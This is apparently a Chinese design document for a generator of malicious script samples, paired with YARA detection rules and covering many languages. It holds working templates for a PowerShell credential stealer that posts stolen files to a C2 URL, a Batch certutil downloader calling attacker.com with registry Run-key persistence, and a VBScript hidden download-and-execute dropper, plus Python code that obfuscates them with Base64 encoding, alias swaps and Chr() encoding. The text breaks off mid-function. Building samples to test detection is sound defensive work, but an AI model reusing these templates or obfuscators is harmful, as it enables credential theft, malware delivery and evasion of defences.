# 样本生成器 v2.0 - 全平台语言覆盖设计

**版本**: v2.0.0  
**创建时间**: 2026-03-25  
**目标**: 覆盖所有平台的常见脚本/技能代码类型

---

## 📊 语言覆盖矩阵

### 按平台分类

```
┌─────────────────────────────────────────────────────────────────┐
│                      全平台语言覆盖                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Windows (10 种)           Unix/Linux/macOS (8 种)               │
│  ┌──────────────────────┐  ┌──────────────────────────────┐     │
│  │ ✅ PowerShell         │  │ ✅ Bash/Sh                    │     │
│  │ ✅ Batch (BAT/CMD)    │  │ ✅ Python                     │     │
│  │ ✅ VBScript (VBS)     │  │ ✅ Perl                       │     │
│  │ ✅ VBA (Excel/Word)   │  │ ✅ Ruby                       │     │
│  │ ✅ JScript            │  │ ✅ PHP                        │     │
│  │ ✅ JavaScript (WSH)   │  │ ✅ Lua                        │     │
│  │ ✅ TypeScript (Node)  │  │ ✅ Tcl                        │     │
│  │ ✅ C# (.NET)          │  │ ✅ AppleScript (macOS)        │     │
│  │ ✅ F# (.NET)          │  │ ✅ Zsh                        │     │
│  │ ✅ IronPython         │  │ ✅ R                          │     │
│  └──────────────────────┘  └──────────────────────────────┘     │
│                                                                  │
│  跨平台 Web (6 种)         系统/嵌入式 (4 种)                    │
│  ┌──────────────────────┐  ┌──────────────────────────────┐     │
│  │ ✅ JavaScript         │  │ ✅ Go                         │     │
│  │ ✅ TypeScript         │  │ ✅ Rust                       │     │
│  │ ✅ PHP                │  │ ✅ C/C++                      │     │
│  │ ✅ Python             │  │ ✅ Assembly                   │     │
│  │ ✅ Ruby               │  │                               │     │
│  │ ✅ Java               │  │                               │     │
│  └──────────────────────┘  └──────────────────────────────┘     │
│                                                                  │
│  移动端 (4 种)             配置/数据 (4 种)                      │
│  ┌──────────────────────┐  ┌──────────────────────────────┐     │
│  │ ✅ Swift (iOS)        │  │ ✅ YAML                       │     │
│  │ ✅ Kotlin (Android)   │  │ ✅ JSON                       │     │
│  │ ✅ Java (Android)     │  │ ✅ XML                        │     │
│  │ ✅ Dart (Flutter)     │  │ ✅ TOML                       │     │
│  └──────────────────────┘  └──────────────────────────────┘     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**总计**: 36 种语言/格式

---

## 🎯 优先级划分

### P0 - 核心语言 (立即支持)

**覆盖 80% 真实场景**

| 语言 | 平台 | 使用场景 | 优先级 |
|------|------|---------|--------|
| **PowerShell** | Windows | 系统管理、自动化、攻击 | P0 |
| **Batch (BAT)** | Windows | 传统脚本、启动器 | P0 |
| **VBScript** | Windows | 传统自动化、恶意脚本 | P0 |
| **Bash** | Linux/macOS | 系统脚本、DevOps | P0 |
| **Python** | 跨平台 | 通用脚本、AI/ML | P0 |
| **JavaScript** | 跨平台 | Web、Node.js、WSH | P0 |
| **PHP** | 跨平台 | WebShell、后端 | P0 |
| **Go** | 跨平台 | 云原生、工具开发 | P0 |

---

### P1 - 重要语言 (本周支持)

**覆盖 15% 真实场景**

| 语言 | 平台 | 使用场景 | 优先级 |
|------|------|---------|--------|
| **VBA** | Windows | Office 宏、文档攻击 | P1 |
| **AppleScript** | macOS | macOS 自动化 | P1 |
| **Perl** | Linux/Unix | 传统 CGI、系统脚本 | P1 |
| **Ruby** | 跨平台 | Web 开发、Metasploit | P1 |
| **TypeScript** | 跨平台 | 现代 Web、Node.js | P1 |
| **Java** | 跨平台 | 企业应用、Android | P1 |
| **C#** | Windows/.NET | .NET 应用、工具 | P1 |
| **Lua** | 跨平台 | 游戏脚本、嵌入 | P1 |

---

### P2 - 扩展语言 (本月支持)

**覆盖 4% 真实场景**

| 语言 | 平台 | 使用场景 | 优先级 |
|------|------|---------|--------|
| **VBS/JScript** | Windows | WSH 脚本 | P2 |
| **F#** | .NET | 函数式编程 | P2 |
| **Swift** | iOS/macOS | iOS 应用 | P2 |
| **Kotlin** | Android | Android 应用 | P2 |
| **Rust** | 跨平台 | 系统编程 | P2 |
| **R** | 数据科学 | 统计分析 | P2 |
| **Dart** | 跨平台 | Flutter 应用 | P2 |
| **Tcl** | 嵌入式 | 测试脚本 | P2 |

---

### P3 - 特殊格式 (按需支持)

**配置/数据/其他**

| 格式 | 用途 | 风险场景 |
|------|------|---------|
| **YAML** | 配置、CI/CD | CI/CD 投毒 |
| **JSON** | 配置、数据 | 配置注入 |
| **XML** | 配置、SOAP | XXE 攻击 |
| **TOML** | 配置 | 配置篡改 |
| **Assembly** | 逆向、Shellcode | 二进制攻击 |
| **C/C++** | 系统编程 | 漏洞利用 |

---

## 📋 详细设计 - P0 核心语言

### 1. PowerShell

**攻击场景**:
- 凭据窃取 (Mimikatz)
- 横向移动 (PsExec)
- 持久化 (计划任务/注册表)
- 数据外传
- 下载执行

**样本模板**:
```powershell
# 模板：凭据窃取
function Get-StoredCredentials {
    param(
        [string]$TargetPath = "$env:APPDATA\..\Local\Microsoft\Credentials"
    )
    
    $creds = @()
    foreach ($file in Get-ChildItem -Path $TargetPath -Recurse) {
        $content = Get-Content $file.FullName -Raw
        $creds += [PSCustomObject]@{
            File = $file.FullName
            Content = $content
        }
    }
    
    # 外传
    $creds | ConvertTo-Json | Invoke-RestMethod -Uri "{C2_URL}" -Method POST
}

Get-StoredCredentials
```

**检测规则**:
```yaml
# YARA 规则
rule PowerShell_Credential_Theft {
    meta:
        description = "Detects PowerShell credential theft"
        severity = "high"
    
    strings:
        $s1 = "Get-StoredCredentials"
        $s2 = "Microsoft\\Credentials"
        $s3 = "Invoke-RestMethod"
        $r1 = /Invoke-(?:RestMethod|WebRequest|Expression)/
    
    condition:
        any of them
}
```

**生成器实现**:
```python
# languages/powershell.py

class PowerShellGenerator(BaseGenerator):
    """PowerShell 样本生成器"""
    
    def __init__(self, config):
        super().__init__(config)
        self.language = "powershell"
        self.file_extension = ".ps1"
    
    def _load_templates(self):
        return {
            'credential_theft': self._credential_theft_template,
            'lateral_movement': self._lateral_movement_template,
            'persistence': self._persistence_template,
            'data_exfil': self._data_exfil_template,
            'download_execute': self._download_execute_template,
        }
    
    def _credential_theft_template(self):
        return """
function Get-StoredCredentials {{
    param([string]$TargetPath = "{TARGET_PATH}")
    $creds = @()
    foreach ($file in Get-ChildItem -Path $TargetPath -Recurse) {{
        $content = Get-Content $file.FullName -Raw
        $creds += [PSCustomObject]@{{
            File = $file.FullName
            Content = $content
        }}
    }}
    $creds | ConvertTo-Json | Invoke-RestMethod -Uri "{C2_URL}" -Method POST
}}
Get-StoredCredentials
""".strip()
    
    def _apply_obfuscation(self, code, level):
        """PowerShell 特有混淆"""
        techniques = [
            self._encode_command,      # -EncodedCommand Base64
            self._insert_garbage,      # 插入垃圾代码
            self._variable_randomize,  # 变量随机化
            self._alias_substitute,    # 命令别名替换
            self._string_split,        # 字符串拆分
        ]
        
        for i in range(min(level, len(techniques))):
            code = techniques[i](code)
        
        return code
    
    def _encode_command(self, code):
        """Base64 编码命令"""
        import base64
        encoded = base64.b64encode(code.encode('utf-16-le')).decode()
        return f"powershell.exe -EncodedCommand {encoded}"
    
    def _alias_substitute(self, code):
        """命令别名替换"""
        aliases = {
            'Get-ChildItem': 'gci',
            'Get-Content': 'gc',
            'Invoke-RestMethod': 'irm',
            'Invoke-WebRequest': 'iwr',
            'Invoke-Expression': 'iex',
            'Set-Content': 'sc',
            'Remove-Item': 'rm',
        }
        for cmd, alias in aliases.items():
            code = code.replace(cmd, alias)
        return code
```

---

### 2. Batch (BAT/CMD)

**攻击场景**:
- 启动器/加载器
- 文件操作
- 注册表操作
- 网络请求
- 系统信息收集

**样本模板**:
```batch
@echo off
REM 模板：启动器
set C2_URL=http://attacker.com/payload.exe
set TEMP_FILE=%TEMP%\payload.exe

certutil -urlcache -split -f %C2_URL% %TEMP_FILE%
start "" %TEMP_FILE%
del %TEMP_FILE%

REM 持久化
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "%TEMP_FILE%" /f
```

**检测规则**:
```yaml
rule Batch_Downloader {
    meta:
        description = "Detects Batch file downloading payloads"
        severity = "high"
    
    strings:
        $s1 = "certutil -urlcache"
        $s2 = "bitsadmin /transfer"
        $s3 = "powershell -c"
        $r1 = /(?:http|ftp):\/\/[a-zA-Z0-9.-]+/
    
    condition:
        ($s1 or $s2 or $s3) and $r1
}
```

**生成器实现**:
```python
# languages/batch.py

class BatchGenerator(BaseGenerator):
    """Batch 脚本生成器"""
    
    def __init__(self, config):
        super().__init__(config)
        self.language = "batch"
        self.file_extension = ".bat"
    
    def _load_templates(self):
        return {
            'downloader': self._downloader_template,
            'launcher': self._launcher_template,
            'registry_persist': self._registry_persist_template,
            'info_stealer': self._info_stealer_template,
        }
    
    def _downloader_template(self):
        return """
@echo off
set C2_URL={C2_URL}
set TEMP_FILE=%TEMP%\\{PAYLOAD_NAME}

REM 下载方式 1: certutil
certutil -urlcache -split -f %C2_URL% %TEMP_FILE%

REM 下载方式 2: bitsadmin
REM bitsadmin /transfer myJob %C2_URL% %TEMP_FILE%

REM 执行
start "" %TEMP_FILE%

REM 清理
timeout /t 5 /nobreak >nul
del %TEMP_FILE%
""".strip()
    
    def _apply_obfuscation(self, code, level):
        """Batch 特有混淆"""
        techniques = [
            self._variable_encode,     # 变量编码
            self._insert_comments,     # 插入注释
            self._command_split,       # 命令拆分
            self._goto_label,          # GOTO 混淆
        ]
        
        for i in range(min(level, len(techniques))):
            code = techniques[i](code)
        
        return code
    
    def _variable_encode(self, code):
        """变量编码"""
        import random
        import string
        
        # 查找所有变量定义
        vars = re.findall(r'set\s+(\w+)=(.+)', code)
        for var_name, var_value in vars:
            encoded_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            code = code.replace(var_name, f"%{encoded_name}%")
            code = f"set {encoded_name}={var_value}\n" + code
        
        return code
```

---

### 3. VBScript (VBS)

**攻击场景**:
- WSH 脚本执行
- 文件操作
- 注册表操作
- 网络请求
- 进程创建

**样本模板**:
```vbscript
' 模板：下载执行
Dim http, ado, file
Set http = CreateObject("MSXML2.XMLHTTP")
Set ado = CreateObject("ADODB.Stream")
Set file = CreateObject("Scripting.FileSystemObject")

http.Open "GET", "{C2_URL}", False
http.Send

ado.Type = 1
ado.Mode = 3
ado.Open
ado.Write http.ResponseBody
ado.SaveToFile "%TEMP%\payload.exe", 2
ado.Close

Set shell = CreateObject("WScript.Shell")
shell.Run "%TEMP%\payload.exe", 0, False
```

**检测规则**:
```yaml
rule VBScript_Downloader {
    meta:
        description = "Detects VBScript downloading payloads"
        severity = "high"
    
    strings:
        $s1 = "MSXML2.XMLHTTP"
        $s2 = "ADODB.Stream"
        $s3 = "Scripting.FileSystemObject"
        $s4 = "WScript.Shell"
        $r1 = /\.SaveToFile/
    
    condition:
        $s1 and $s2 and ($s3 or $s4) and $r1
}
```

**生成器实现**:
```python
# languages/vbscript.py

class VBScriptGenerator(BaseGenerator):
    """VBScript 样本生成器"""
    
    def __init__(self, config):
        super().__init__(config)
        self.language = "vbscript"
        self.file_extension = ".vbs"
    
    def _load_templates(self):
        return {
            'downloader': self._downloader_template,
            'file_stealer': self._file_stealer_template,
            'registry_mod': self._registry_mod_template,
            'process_create': self._process_create_template,
        }
    
    def _downloader_template(self):
        return """
Dim http, ado, file, shell
Set http = CreateObject("MSXML2.XMLHTTP")
Set ado = CreateObject("ADODB.Stream")
Set file = CreateObject("Scripting.FileSystemObject")

http.Open "GET", "{C2_URL}", False
http.Send

ado.Type = 1
ado.Mode = 3
ado.Open
ado.Write http.ResponseBody
ado.SaveToFile "{OUTPUT_PATH}", 2
ado.Close

Set shell = CreateObject("WScript.Shell")
shell.Run "{OUTPUT_PATH}", 0, False
""".strip()
    
    def _apply_obfuscation(self, code, level):
        """VBScript 特有混淆"""
        techniques = [
            self._string_concat,       # 字符串拼接
            self._chr_encode,          # Chr() 编码
            self._variable_randomize,  # 变量随机化
            self._insert_garbage,      # 垃圾代码
        ]
        
        for i in range(min(level, len(techniques))):
            code = techniques[i](code)
        
        return code
    
    def _chr_encode(self, code):
        """Chr() 编码字符串"""
        import re
        
        def replace_string(match):
            s = match.group(0)[1:-1]  # 去掉引号
            return " & ".join([f"Chr({ord(c)})" for c in s])
        
        # 替换所有字符串
        code = re.sub(r'"[^"]*"', replace_string, code)
